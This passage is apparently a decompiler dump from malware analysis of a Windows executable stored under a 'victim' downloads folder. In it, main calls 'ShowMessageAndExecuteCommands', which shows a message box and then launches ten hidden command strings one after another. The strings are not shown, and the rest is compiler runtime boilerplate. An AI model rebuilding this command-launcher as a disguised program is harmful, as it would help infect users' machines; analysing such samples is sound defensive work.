(stack, 0xffffffffffffffd8, 8) INDIRECT (stack, 0xffffffffffffffd8, 8) , (const, 0xba, 4)
(stack, 0xffffffffffffffe0, 8) INDIRECT (stack, 0xffffffffffffffe0, 8) , (const, 0xba, 4)
(stack, 0xfffffffffffffff4, 4) INDIRECT (stack, 0xfffffffffffffff4, 4) , (const, 0xba, 4)
 ---  CALL (ram, 0x1400082e0, 8) , (const, 0x0, 8) , (unique, 0x1000011a, 8) , (unique, 0x10000112, 8) , (const, 0x10, 4)
 ---  RETURN (const, 0x0, 8)
(stack, 0xffffffffffffff08, 4) INDIRECT (stack, 0xffffffffffffff08, 4) , (const, 0xc5, 4)
(stack, 0xffffffffffffff44, 4) INDIRECT (stack, 0xffffffffffffff44, 4) , (const, 0xc5, 4)
(stack, 0xffffffffffffff48, 2) INDIRECT (stack, 0xffffffffffffff48, 2) , (const, 0xc5, 4)
(stack, 0xffffffffffffff78, 8) INDIRECT (stack, 0xffffffffffffff78, 8) , (const, 0xc5, 4)
(stack, 0xffffffffffffff80, 8) INDIRECT (stack, 0xffffffffffffff80, 8) , (const, 0xc5, 4)
(stack, 0xffffffffffffff98, 8) INDIRECT (stack, 0xffffffffffffff98, 8) , (const, 0xc5, 4)
(stack, 0xffffffffffffffa0, 8) INDIRECT (stack, 0xffffffffffffffa0, 8) , (const, 0xc5, 4)
(stack, 0xffffffffffffffa8, 8) INDIRECT (stack, 0xffffffffffffffa8, 8) , (const, 0xc5, 4)
(stack, 0xffffffffffffffb0, 8) INDIRECT (stack, 0xffffffffffffffb0, 8) , (const, 0xc5, 4)
(stack, 0xffffffffffffffb8, 8) INDIRECT (stack, 0xffffffffffffffb8, 8) , (const, 0xc5, 4)
(stack, 0xffffffffffffffc0, 8) INDIRECT (stack, 0xffffffffffffffc0, 8) , (const, 0xc5, 4)
(stack, 0xffffffffffffffc8, 8) INDIRECT (stack, 0xffffffffffffffc8, 8) , (const, 0xc5, 4)
(stack, 0xffffffffffffffd0, 8) INDIRECT (stack, 0xffffffffffffffd0, 8) , (const, 0xc5, 4)
(stack, 0xffffffffffffffd8, 8) INDIRECT (stack, 0xffffffffffffffd8, 8) , (const, 0xc5, 4)
(stack, 0xffffffffffffffe0, 8) INDIRECT (stack, 0xffffffffffffffe0, 8) , (const, 0xc5, 4)
(stack, 0xfffffffffffffff4, 4) INDIRECT (stack, 0xfffffffffffffff4, 4) , (const, 0xc5, 4)
 ---  CALL (ram, 0x140008200, 8) , (stack, 0xffffffffffffff78, 8) , (const, 0xffffffff, 4)
(stack, 0xffffffffffffff08, 4) INDIRECT (stack, 0xffffffffffffff08, 4) , (const, 0xce, 4)
(stack, 0xffffffffffffff44, 4) INDIRECT (stack, 0xffffffffffffff44, 4) , (const, 0xce, 4)
(stack, 0xffffffffffffff48, 2) INDIRECT (stack, 0xffffffffffffff48, 2) , (const, 0xce, 4)
(stack, 0xffffffffffffff78, 8) INDIRECT (stack, 0xffffffffffffff78, 8) , (const, 0xce, 4)
(stack, 0xffffffffffffff80, 8) INDIRECT (stack, 0xffffffffffffff80, 8) , (const, 0xce, 4)
(stack, 0xffffffffffffff98, 8) INDIRECT (stack, 0xffffffffffffff98, 8) , (const, 0xce, 4)
(stack, 0xffffffffffffffa0, 8) INDIRECT (stack, 0xffffffffffffffa0, 8) , (const, 0xce, 4)
(stack, 0xffffffffffffffa8, 8) INDIRECT (stack, 0xffffffffffffffa8, 8) , (const, 0xce, 4)
(stack, 0xffffffffffffffb0, 8) INDIRECT (stack, 0xffffffffffffffb0, 8) , (const, 0xce, 4)
(stack, 0xffffffffffffffb8, 8) INDIRECT (stack, 0xffffffffffffffb8, 8) , (const, 0xce, 4)
(stack, 0xffffffffffffffc0, 8) INDIRECT (stack, 0xffffffffffffffc0, 8) , (const, 0xce, 4)
(stack, 0xffffffffffffffc8, 8) INDIRECT (stack, 0xffffffffffffffc8, 8) , (const, 0xce, 4)
(stack, 0xffffffffffffffd0, 8) INDIRECT (stack, 0xffffffffffffffd0, 8) , (const, 0xce, 4)
(stack, 0xffffffffffffffd8, 8) INDIRECT (stack, 0xffffffffffffffd8, 8) , (const, 0xce, 4)
(stack, 0xffffffffffffffe0, 8) INDIRECT (stack, 0xffffffffffffffe0, 8) , (const, 0xce, 4)
(stack, 0xfffffffffffffff4, 4) INDIRECT (stack, 0xfffffffffffffff4, 4) , (const, 0xce, 4)
 ---  CALL (ram, 0x1400081a0, 8) , (stack, 0xffffffffffffff78, 8)
(stack, 0xffffffffffffff08, 4) INDIRECT (stack, 0xffffffffffffff08, 4) , (const, 0xd7, 4)
(stack, 0xffffffffffffff44, 4) INDIRECT (stack, 0xffffffffffffff44, 4) , (const, 0xd7, 4)
(stack, 0xffffffffffffff48, 2) INDIRECT (stack, 0xffffffffffffff48, 2) , (const, 0xd7, 4)
(stack, 0xffffffffffffff78, 8) INDIRECT (stack, 0xffffffffffffff78, 8) , (const, 0xd7, 4)
(stack, 0xffffffffffffff80, 8) INDIRECT (stack, 0xffffffffffffff80, 8) , (const, 0xd7, 4)
(stack, 0xffffffffffffff98, 8) INDIRECT (stack, 0xffffffffffffff98, 8) , (const, 0xd7, 4)
(stack, 0xffffffffffffffa0, 8) INDIRECT (stack, 0xffffffffffffffa0, 8) , (const, 0xd7, 4)
(stack, 0xffffffffffffffa8, 8) INDIRECT (stack, 0xffffffffffffffa8, 8) , (const, 0xd7, 4)
(stack, 0xffffffffffffffb0, 8) INDIRECT (stack, 0xffffffffffffffb0, 8) , (const, 0xd7, 4)
(stack, 0xffffffffffffffb8, 8) INDIRECT (stack, 0xffffffffffffffb8, 8) , (const, 0xd7, 4)
(stack, 0xffffffffffffffc0, 8) INDIRECT (stack, 0xffffffffffffffc0, 8) , (const, 0xd7, 4)
(stack, 0xffffffffffffffc8, 8) INDIRECT (stack, 0xffffffffffffffc8, 8) , (const, 0xd7, 4)
(stack, 0xffffffffffffffd0, 8) INDIRECT (stack, 0xffffffffffffffd0, 8) , (const, 0xd7, 4)
(stack, 0xffffffffffffffd8, 8) INDIRECT (stack, 0xffffffffffffffd8, 8) , (const, 0xd7, 4)
(stack, 0xffffffffffffffe0, 8) INDIRECT (stack, 0xffffffffffffffe0, 8) , (const, 0xd7, 4)
(stack, 0xfffffffffffffff4, 4) INDIRECT (stack, 0xfffffffffffffff4, 4) , (const, 0xd7, 4)
 ---  CALL (ram, 0x1400081a0, 8) , (stack, 0xffffffffffffff80, 8)
(unique, 0x6b00, 4) INT_ADD (stack, 0xfffffffffffffff4, 4) , (const, 0x1, 4)


Native Assembly Code:
PUSH RBP
SUB RSP,0x140
LEA RBP,[RSP + 0x80]
MOV R9D,0x30
LEA R8,[0x140004000]
LEA RAX,[0x140004008]
MOV RDX,RAX
MOV ECX,0x0
MOV RAX,qword ptr [0x1400082e0]
CALL RAX
LEA RAX,[0x14000403e]
MOV qword ptr [RBP + 0x60],RAX
LEA RAX,[0x140004058]
MOV qword ptr [RBP + 0x68],RAX
LEA RAX,[0x14000406d]
MOV qword ptr [RBP + 0x70],RAX
LEA RAX,[0x140004082]
MOV qword ptr [RBP + 0x78],RAX
LEA RAX,[0x140004099]
MOV qword ptr [RBP + 0x80],RAX
LEA RAX,[0x1400040b7]
MOV qword ptr [RBP + 0x88],RAX
LEA RAX,[0x1400040d5]
MOV qword ptr [RBP + 0x90],RAX
LEA RAX,[0x1400040f3]
MOV qword ptr [RBP + 0x98],RAX
LEA RAX,[0x140004110]
MOV qword ptr [RBP + 0xa0],RAX
LEA RAX,[0x14000412e]
MOV qword ptr [RBP + 0xa8],RAX
MOV dword ptr [RBP + 0xbc],0x0
JMP 0x14000161b
LEA RAX,[RBP + -0x30]
MOV R8D,0x68
MOV EDX,0x0
MOV RCX,RAX
CALL 0x1400027f8
MOV dword ptr [RBP + -0x30],0x68
MOV dword ptr [RBP + 0xc],0x1
MOV word ptr [RBP + 0x10],0x0
LEA RAX,[RBP + 0x40]
MOV R8D,0x18
MOV EDX,0x0
MOV RCX,RAX
CALL 0x1400027f8
MOV EAX,dword ptr [RBP + 0xbc]
CDQE
MOV RAX,qword ptr [RBP + RAX*0x8 + 0x60]
LEA RDX,[RBP + 0x40]
MOV qword ptr [RSP + 0x48],RDX
LEA RDX,[RBP + -0x30]
MOV qword ptr [RSP + 0x40],RDX
MOV qword ptr [RSP + 0x38],0x0
MOV qword ptr [RSP + 0x30],0x0
MOV dword ptr [RSP + 0x28],0x0
MOV dword ptr [RSP + 0x20],0x0
MOV R9D,0x0
MOV R8D,0x0
MOV RDX,RAX
MOV ECX,0x0
MOV RAX,qword ptr [0x1400081a8]
CALL RAX
TEST EAX,EAX
JNZ 0x1400015df
MOV R9D,0x10
LEA R8,[0x140004145]
LEA RAX,[0x140004150]
MOV RDX,RAX
MOV ECX,0x0
MOV RAX,qword ptr [0x1400082e0]
CALL RAX
JMP 0x14000162a
MOV RAX,qword ptr [RBP + 0x40]
MOV EDX,0xffffffff
MOV RCX,RAX
MOV RAX,qword ptr [0x140008200]
CALL RAX
MOV RAX,qword ptr [RBP + 0x40]
MOV RCX,RAX
MOV RAX,qword ptr [0x1400081a0]
CALL RAX
MOV RAX,qword ptr [RBP + 0x48]
MOV RCX,RAX
MOV RAX,qword ptr [0x1400081a0]
CALL RAX
ADD dword ptr [RBP + 0xbc],0x1
MOV EAX,dword ptr [RBP + 0xbc]
CMP EAX,0x9
JBE 0x140001514
ADD RSP,0x140
POP RBP
RET




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: main
C Decompilation:

int __cdecl main(int _Argc,char **_Argv,char **_Env)

{
  __main();
  ShowMessageAndExecuteCommands();
  return 0;
}



Pcode Representation:
 ---  CALL (ram, 0x140001700, 8)
 ---  CALL (ram, 0x140001450, 8)
(register, 0x0, 4) COPY (const, 0x0, 4)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 4)


Native Assembly Code:
PUSH RBP
MOV RBP,RSP
SUB RSP,0x20
CALL 0x140001700
CALL 0x140001450
MOV EAX,0x0
ADD RSP,0x20
POP RBP
RET




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: __do_global_dtors
C Decompilation:

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void __do_global_dtors(void)

{
  func_ptr p_Var1;
  
  p_Var1 = *__do_global_dtors::p;
  while (p_Var1 != (func_ptr)0x0) {
    (*p_Var1)();
    p_Var1 = __do_global_dtors::p[1];
    __do_global_dtors::p = __do_global_dtors::p + 1;
  }
  return;
}



Pcode Representation:
(unique, 0xdc00, 8) LOAD (const, 0x1b1, 4) , (ram, 0x140003000, 8)
(unique, 0x1000003b, 8) COPY (ram, 0x140003000, 8)
(unique, 0x1000002a, 8) MULTIEQUAL (unique, 0xdc00, 8) , (unique, 0xdc00, 8)
(unique, 0x10000033, 8) MULTIEQUAL (unique, 0x1000003b, 8) , (unique, 0x10000043, 8)
(unique, 0x10000032, 1) INT_NOTEQUAL (unique, 0x1000002a, 8) , (const, 0x0, 8)
 ---  CBRANCH (ram, 0x140001685, 1) , (unique, 0x10000032, 1)
(ram, 0x140003000, 8) INDIRECT (unique, 0x10000033, 8) , (const, 0x1b, 4)
 ---  CALLIND (unique, 0x1000002a, 8)
(unique, 0x4400, 8) PTRADD (ram, 0x140003000, 8) , (const, 0x1, 8) , (const, 0x8, 8)
(unique, 0x4400, 8) PTRADD (ram, 0x140003000, 8) , (const, 0x1, 8) , (const, 0x8, 8)
(unique, 0xdc00, 8) LOAD (const, 0x1b1, 4) , (unique, 0x4400, 8)
(unique, 0x10000043, 8) COPY (unique, 0x4400, 8)
(ram, 0x140003000, 8) COPY (unique, 0x10000033, 8)
(ram, 0x140003000, 8) COPY (ram, 0x140003000, 8)
 ---  RETURN (const, 0x0, 8)


Native Assembly Code:
SUB RSP,0x28
MOV RAX,qword ptr [0x140003000]
MOV RAX,qword ptr [RAX]
TEST RAX,RAX
JZ 0x140001685
NOP dword ptr [RAX + RAX*0x1]
CALL RAX
MOV RAX,qword ptr [0x140003000]
LEA RDX,[RAX + 0x8]
MOV RAX,qword ptr [RAX + 0x8]
MOV qword ptr [0x140003000],RDX
TEST RAX,RAX
JNZ 0x140001668
ADD RSP,0x28
RET




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: __do_global_ctors
C Decompilation:

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void __do_global_ctors(void)

{
  undefined8 *puVar1;
  uint uVar2;
  ulonglong uVar3;
  undefined8 *puVar4;
  
  uVar2 = (uint)*(undefined8 *)_refptr___CTOR_LIST__;
  if (uVar2 == 0xffffffff) {
    uVar3 = 0;
    do {
      uVar2 = (uint)uVar3;
      uVar3 = (ulonglong)(uVar2 + 1);
    } while (*(longlong *)(_refptr___CTOR_LIST__ + uVar3 * 8) != 0);
  }
  if (uVar2 != 0) {
    puVar4 = (undefined8 *)(_refptr___CTOR_LIST__ + (ulonglong)uVar2 * 8);
    puVar1 = (undefined8 *)
             (_refptr___CTOR_LIST__ + ((ulonglong)uVar2 - (ulonglong)(uVar2 - 1)) * 8 + -8);
    do {
      (*(code *)*puVar4)();
      puVar4 = puVar4 + -1;
    } while (puVar4 != puVar1);
  }
  atexit(__do_global_dtors);
  return;
}



Pcode Representation:
(unique, 0x10000083, 8) CAST (ram, 0x1400044d0, 8)
(unique, 0xdc00, 8) LOAD (const, 0x1b1, 4) , (unique, 0x10000083, 8)
(register, 0x0, 4) SUBPIECE (unique, 0xdc00, 8) , (const, 0x0, 4)
(register, 0x206, 1) INT_EQUAL (register, 0x0, 4) , (const, 0xffffffff, 4)
 ---  CBRANCH (ram, 0x1400016e0, 1) , (register, 0x206, 1)
(register, 0x0, 8) COPY (const, 0x0, 8)
(register, 0x0, 8) MULTIEQUAL (register, 0x0, 8) , (register, 0x80, 8)
(unique, 0x1000005a, 4) SUBPIECE (register, 0x0, 8) , (const, 0x0, 4)
(register, 0x80, 4) INT_ADD (unique, 0x1000005a, 4) , (const, 0x1, 4)
(register, 0x80, 8) INT_ZEXT (register, 0x80, 4)
(unique, 0x4600, 8) INT_MULT (register, 0x80, 8) , (const, 0x8, 8)
(unique, 0x4700, 8) PTRADD (ram, 0x1400044d0, 8) , (unique, 0x4600, 8) , (const, 0x1, 8)
(unique, 0x1000008b, 8) CAST (unique, 0x4700, 8)
(unique, 0xdc80, 8) LOAD (const, 0x1b1, 4) , (unique, 0x1000008b, 8)
(register, 0x206, 1) INT_NOTEQUAL (unique, 0xdc80, 8) , (const, 0x0, 8)
 ---  CBRANCH (ram, 0x1400016e8, 1) , (register, 0x206, 1)
(register, 0x8, 4) MULTIEQUAL (register, 0x0, 4) , (unique, 0x1000005a, 4)
(register, 0x206, 1) INT_NOTEQUAL (register, 0x8, 4) , (const, 0x0, 4)
 ---  CBRANCH (ram, 0x1400016cb, 1) , (register, 0x206, 1)
(register, 0x0, 8) INT_ZEXT (register, 0x8, 4)
(register, 0x8, 4) INT_SUB (register, 0x8, 4) , (const, 0x1, 4)
(register, 0x8, 8) INT_ZEXT (register, 0x8, 4)
(unique, 0x4600, 8) INT_MULT (register, 0x0, 8) , (const, 0x8, 8)
(unique, 0x10000093, 8) PTRADD (ram, 0x1400044d0, 8) , (unique, 0x4600, 8) , (const, 0x1, 8)
(unique, 0x4700, 8) CAST (unique, 0x10000093, 8)
(register, 0x0, 8) INT_SUB (register, 0x0, 8) , (register, 0x8, 8)
(unique, 0x4c00, 8) INT_MULT (register, 0x0, 8) , (const, 0x8, 8)
(unique, 0x10000073, 8) INT_ADD (unique, 0x4c00, 8) , (const, 0xfffffffffffffff8, 8)
(unique, 0x1000009b, 8) PTRADD (ram, 0x1400044d0, 8) , (unique, 0x10000073, 8) , (const, 0x1, 8)
(unique, 0x4d00, 8) CAST (unique, 0x1000009b, 8)
(ram, 0x1400044d0, 8) MULTIEQUAL (ram, 0x1400044d0, 8) , (ram, 0x1400044d0, 8)
(register, 0x18, 8) MULTIEQUAL (unique, 0x4700, 8) , (register, 0x18, 8)
(unique, 0x100000a3, 8) LOAD (const, 0x1b1, 4) , (register, 0x18, 8)
(unique, 0xdc00, 8) CAST (unique, 0x100000a3, 8)
(ram, 0x1400044d0, 8) INDIRECT (ram, 0x1400044d0, 8) , (const, 0x49, 4)
 ---  CALLIND (unique, 0xdc00, 8)
(register, 0x18, 8) PTRADD (register, 0x18, 8) , (const, 0xffffffffffffffff, 8) , (const, 0x8, 8)
(register, 0x206, 1) INT_NOTEQUAL (register, 0x18, 8) , (unique, 0x4d00, 8)
 ---  CBRANCH (ram, 0x1400016c0, 1) , (register, 0x206, 1)
(ram, 0x1400044d0, 8) MULTIEQUAL (ram, 0x1400044d0, 8) , (ram, 0x1400044d0, 8)
(unique, 0x1000006b, 8) PTRSUB (const, 0x0, 8) , (const, 0x140001650, 8)
(ram, 0x1400044d0, 8) INDIRECT (ram, 0x1400044d0, 8) , (const, 0x71, 4)
 ---  CALL (ram, 0x140001410, 8) , (unique, 0x1000006b, 8)
(ram, 0x1400044d0, 8) COPY (ram, 0x1400044d0, 8)
 ---  RETURN (const, 0x0, 8)


Native Assembly Code:
PUSH RSI
PUSH RBX
SUB RSP,0x28
MOV RDX,qword ptr [0x1400044d0]
MOV RAX,qword ptr [RDX]
MOV ECX,EAX
CMP EAX,-0x1
JZ 0x1400016e0
TEST ECX,ECX
JZ 0x1400016cb
MOV EAX,ECX
SUB ECX,0x1
LEA RBX,[RDX + RAX*0x8]
SUB RAX,RCX
LEA RSI,[RDX + RAX*0x8 + -0x8]
NOP dword ptr [RAX]
CALL qword ptr [RBX]
SUB RBX,0x8
CMP RBX,RSI
JNZ 0x1400016c0
LEA RCX,[0x140001650]
ADD RSP,0x28
POP RBX
POP RSI
JMP 0x140001410
XOR EAX,EAX
NOP word ptr [RAX + RAX*0x1]
LEA R8D,[RAX + 0x1]
MOV ECX,EAX
CMP qword ptr [RDX + R8*0x8],0x0
MOV RAX,R8
JNZ 0x1400016e8
JMP 0x1400016a7




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: __main
C Decompilation:

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void __main(void)

{
  if (initialized != 0) {
    return;
  }
  initialized = 1;
  __do_global_ctors();
  return;
}



Pcode Representation:
(register, 0x206, 1) INT_NOTEQUAL (ram, 0x140007030, 4) , (const, 0x0, 4)
 ---  CBRANCH (ram, 0x140001710, 1) , (register, 0x206, 1)
(ram, 0x140007030, 4) COPY (const, 0x1, 4)
(ram, 0x140007030, 4) INDIRECT (ram, 0x140007030, 4) , (const, 0x10, 4)
 ---  CALL (ram, 0x140001690, 8)
(ram, 0x140007030, 4) COPY (ram, 0x140007030, 4)
 ---  RETURN (const, 0x0, 8)
(ram, 0x140007030, 4) COPY (ram, 0x140007030, 4)
 ---  RETURN (const, 0x0, 8)


Native Assembly Code:
MOV EAX,dword ptr [0x140007030]
TEST EAX,EAX
JZ 0x140001710
RET
MOV dword ptr [0x140007030],0x1
JMP 0x140001690




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: _setargv
C Decompilation:

int __cdecl _setargv(void)

{
  return 0;
}



Pcode Representation:
(register, 0x0, 4) COPY (const, 0x0, 4)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 4)


Native Assembly Code:
XOR EAX,EAX
RET




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: __dyn_tls_dtor
C Decompilation:

/* WARNING: Unknown calling convention */

BOOL __dyn_tls_dtor(HANDLE hDllHandle,DWORD dwReason,LPVOID lpreserved)

{
  if ((dwReason != 3) && (dwReason != 0)) {
    return 1;
  }
  __mingw_TLScallback(hDllHandle,dwReason,lpreserved);
  return 1;
}



Pcode Representation:
(register, 0x206, 1) INT_NOTEQUAL (register, 0x10, 4) , (const, 0x3, 4)
 ---  CBRANCH (ram, 0x140001750, 1) , (register, 0x206, 1)
(register, 0x206, 1) INT_NOTEQUAL (register, 0x10, 4) , (const, 0x0, 4)
 ---  CBRANCH (ram, 0x140001750, 1) , (register, 0x206, 1)
 ---  CALL (ram, 0x1400021d0, 8) , (register, 0x8, 8) , (register, 0x10, 4) , (register, 0x80, 8)
(register, 0x0, 4) COPY (const, 0x1, 4)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 4)
(register, 0x0, 4) COPY (const, 0x1, 4)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 4)


Native Assembly Code:
SUB RSP,0x28
CMP EDX,0x3
JZ 0x140001750
TEST EDX,EDX
JZ 0x140001750
MOV EAX,0x1
ADD RSP,0x28
RET
CALL 0x1400021d0
MOV EAX,0x1
ADD RSP,0x28
RET




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: __dyn_tls_init
C Decompilation:

/* WARNING: Removing unreachable block (ram,0x0001400017a3) */
/* WARNING: Removing unreachable block (ram,0x0001400017a8) */
/* WARNING: Removing unreachable block (ram,0x0001400017b0) */
/* WARNING: Removing unreachable block (ram,0x0001400017b2) */
/* WARNING: Removing unreachable block (ram,0x0001400017bb) */
/* WARNING: Unknown calling convention */

BOOL __dyn_tls_init(HANDLE hDllHandle,DWORD dwReason,LPVOID lpreserved)

{
  if (*(int *)_refptr__CRT_MT != 2) {
    *(undefined4 *)_refptr__CRT_MT = 2;
  }
  if ((dwReason != 2) && (dwReason == 1)) {
    __mingw_TLScallback(hDllHandle,1,lpreserved);
    return 1;
  }
  return 1;
}



Pcode Representation:
(unique, 0x10000058, 8) CAST (ram, 0x1400044b0, 8)
(unique, 0xdb80, 4) LOAD (const, 0x1b1, 4) , (unique, 0x10000058, 8)
(register, 0x206, 1) INT_NOTEQUAL (unique, 0xdb80, 4) , (const, 0x2, 4)
 ---  CBRANCH (ram, 0x140001778, 1) , (register, 0x206, 1)
(unique, 0x10000060, 8) CAST (ram, 0x1400044b0, 8)
(ram, 0x1400044b0, 8) INDIRECT (ram, 0x1400044b0, 8) , (const, 0x1d, 4)
 ---  STORE (const, 0x1b1, 4) , (unique, 0x10000060, 8) , (const, 0x2, 4)
(ram, 0x1400044b0, 8) MULTIEQUAL (ram, 0x1400044b0, 8) , (ram, 0x1400044b0, 8)
(register, 0x206, 1) INT_NOTEQUAL (register, 0x10, 4) , (const, 0x2, 4)
 ---  CBRANCH (ram, 0x140001790, 1) , (register, 0x206, 1)
(register, 0x206, 1) INT_EQUAL (register, 0x10, 4) , (const, 0x1, 4)
 ---  CBRANCH (ram, 0x1400017d0, 1) , (register, 0x206, 1)
(ram, 0x1400044b0, 8) INDIRECT (ram, 0x1400044b0, 8) , (const, 0x4b, 4)
 ---  CALL (ram, 0x1400021d0, 8) , (register, 0x8, 8) , (const, 0x1, 4) , (register, 0x80, 8)
(register, 0x0, 4) COPY (const, 0x1, 4)
(ram, 0x1400044b0, 8) COPY (ram, 0x1400044b0, 8)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 4)
(register, 0x0, 4) COPY (const, 0x1, 4)
(ram, 0x1400044b0, 8) COPY (ram, 0x1400044b0, 8)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 4)


Native Assembly Code:
PUSH RSI
PUSH RBX
SUB RSP,0x28
MOV RAX,qword ptr [0x1400044b0]
CMP dword ptr [RAX],0x2
JZ 0x140001778
MOV dword ptr [RAX],0x2
CMP EDX,0x2
JZ 0x140001790
CMP EDX,0x1
JZ 0x1400017d0
MOV EAX,0x1
ADD RSP,0x28
POP RBX
POP RSI
RET
LEA RBX,[0x140009058]
LEA RSI,[0x140009058]
CMP RBX,RSI
JZ 0x140001782
NOP dword ptr [RAX + RAX*0x1]
MOV RAX,qword ptr [RBX]
TEST RAX,RAX
JZ 0x1400017b2
CALL RAX
ADD RBX,0x8
CMP RBX,RSI
JNZ 0x1400017a8
MOV EAX,0x1
ADD RSP,0x28
POP RBX
POP RSI
RET
CALL 0x1400021d0
MOV EAX,0x1
ADD RSP,0x28
POP RBX
POP RSI
RET




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: __tlregdtor
C Decompilation:

/* WARNING: Unknown calling convention */

int __tlregdtor(_PVFV func)

{
  return 0;
}



Pcode Representation:
(register, 0x0, 4) COPY (const, 0x0, 4)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 4)


Native Assembly Code:
XOR EAX,EAX
RET




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: _matherr
C Decompilation:

int __cdecl _matherr(_exception *_Except)

{
  double dVar1;
  double dVar2;
  double dVar3;
  char *pcVar4;
  FILE *_File;
  char *pcVar5;
  
  switch(_Except->type) {
  default:
    pcVar5 = "Unknown error";
    break;
  case 1:
    pcVar5 = "Argument domain error (DOMAIN)";
    break;
  case 2:
    pcVar5 = "Argument singularity (SIGN)";
    break;
  case 3:
    pcVar5 = "Overflow range error (OVERFLOW)";
    break;
  case 4:
    pcVar5 = "The result is too small to be represented (UNDERFLOW)";
    break;
  case 5:
    pcVar5 = "Total loss of significance (TLOSS)";
    break;
  case 6:
    pcVar5 = "Partial loss of significance (PLOSS)";
  }
  dVar1 = _Except->retval;
  dVar2 = _Except->arg2;
  dVar3 = _Except->arg1;
  pcVar4 = _Except->name;
  _File = __acrt_iob_func(2);
  fprintf((FILE *)_File,"_matherr(): %s in %s(%g, %g)  (retval=%g)\n",pcVar5,pcVar4,dVar3,dVar2,
          dVar1);
  return 0;
}



Pcode Representation:
(unique, 0x100001ae, 8) PTRSUB (register, 0x8, 8) , (const, 0x0, 8)
(unique, 0xdb00, 4) LOAD (const, 0x1b1, 4) , (unique, 0x100001ae, 8)
 ---  BRANCHIND (unique, 0xdb00, 4)
(register, 0x18, 8) COPY (const, 0x140004240, 8)
 ---  BRANCH (ram, 0x14000183f, 1)
(register, 0x18, 8) COPY (const, 0x140004268, 8)
 ---  BRANCH (ram, 0x14000183f, 1)
(register, 0x18, 8) COPY (const, 0x140004290, 8)
 ---  BRANCH (ram, 0x14000183f, 1)
(register, 0x18, 8) COPY (const, 0x140004220, 8)
 ---  BRANCH (ram, 0x14000183f, 1)
(register, 0x18, 8) COPY (const, 0x1400041ff, 8)
(register, 0x18, 8) COPY (const, 0x1400041e0, 8)
 ---  BRANCH (ram, 0x14000183f, 1)
(register, 0x18, 8) COPY (const, 0x1400042c6, 8)
 ---  BRANCH (ram, 0x14000183f, 1)
(register, 0x18, 8) MULTIEQUAL (register, 0x18, 8) , (register, 0x18, 8) , (register, 0x18, 8) , (register, 0x18, 8) , (register, 0x18, 8) , (register, 0x18, 8) , (register, 0x18, 8)
(unique, 0x4400, 8) PTRSUB (register, 0x8, 8) , (const, 0x20, 8)
(unique, 0x6800, 8) LOAD (const, 0x1b1, 4) , (unique, 0x4400, 8)
(unique, 0x4400, 8) PTRSUB (register, 0x8, 8) , (const, 0x18, 8)
(unique, 0x6800, 8) LOAD (const, 0x1b1, 4) , (unique, 0x4400, 8)
(unique, 0x4400, 8) PTRSUB (register, 0x8, 8) , (const, 0x10, 8)
(unique, 0x6800, 8) LOAD (const, 0x1b1, 4) , (unique, 0x4400, 8)
(unique, 0x4400, 8) PTRSUB (register, 0x8, 8) , (const, 0x8, 8)
(unique, 0xdc00, 8) LOAD (const, 0x1b1, 4) , (unique, 0x4400, 8)
(register, 0x0, 8) CALL (ram, 0x140002750, 8) , (const, 0x2, 4)
(unique, 0x100001a6, 8) COPY (const, 0x1400042d8, 8)
(unique, 0x100001d6, 8) CAST (register, 0x0, 8)
 ---  CALL (ram, 0x1400027d0, 8) , (unique, 0x100001d6, 8) , (unique, 0x100001a6, 8) , (register, 0x18, 8) , (unique, 0xdc00, 8) , (unique, 0x6800, 8) , (unique, 0x6800, 8) , (unique, 0x6800, 8)
(register, 0x0, 4) COPY (const, 0x0, 4)
 ---  RETURN (const, 0x0, 8) , (register, 0x0, 4)


Native Assembly Code:
PUSH RSI
PUSH RBX
SUB RSP,0x78
MOVUPS xmmword ptr [RSP + 0x40],XMM6
MOVUPS xmmword ptr [RSP + 0x50],XMM7
MOVUPS xmmword ptr [RSP + 0x60],XMM8
CMP dword ptr [RCX],0x6
JA 0x1400018ec
MOV EAX,dword ptr [RCX]
LEA RDX,[0x140004304]
MOVSXD RAX,dword ptr [RDX + RAX*0x4]
ADD RAX,RDX
JMP RAX
LEA RBX,[0x1400041ff]
MOVSD XMM8,qword ptr [RCX + 0x20]
MOVSD XMM7,qword ptr [RCX + 0x18]
MOVSD XMM6,qword ptr [RCX + 0x10]
MOV RSI,qword ptr [RCX + 0x8]
MOV ECX,0x2
CALL 0x140002750
MOVSD qword ptr [RSP + 0x30],XMM8
MOV R8,RBX
LEA RDX,[0x1400042d8]
MOVSD qword ptr [RSP + 0x28],XMM7
MOV RCX,RAX
MOV R9,RSI
MOVSD qword ptr [RSP + 0x20],XMM6
CALL 0x1400027d0
NOP
MOVUPS XMM6,xmmword ptr [RSP + 0x40]
MOVUPS XMM7,xmmword ptr [RSP + 0x50]
XOR EAX,EAX
MOVUPS XMM8,xmmword ptr [RSP + 0x60]
ADD RSP,0x78
POP RBX
POP RSI
RET
LEA RBX,[0x1400041e0]
JMP 0x14000183f
LEA RBX,[0x140004240]
JMP 0x14000183f
LEA RBX,[0x140004220]
JMP 0x14000183f
LEA RBX,[0x140004290]
JMP 0x14000183f
LEA RBX,[0x140004268]
JMP 0x14000183f
LEA RBX,[0x1400042c6]
JMP 0x14000183f




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: _fpreset
C Decompilation:

void __cdecl _fpreset(void)

{
  return;
}



Pcode Representation:
 ---  RETURN (const, 0x0, 8)


Native Assembly Code:
FNINIT
RET




// Original file: C:\Users\victim\Downloads\babapro\ScnKopH.exe
Function: __report_error
C Decompilation:

/* WARNING: Unknown calling convention */
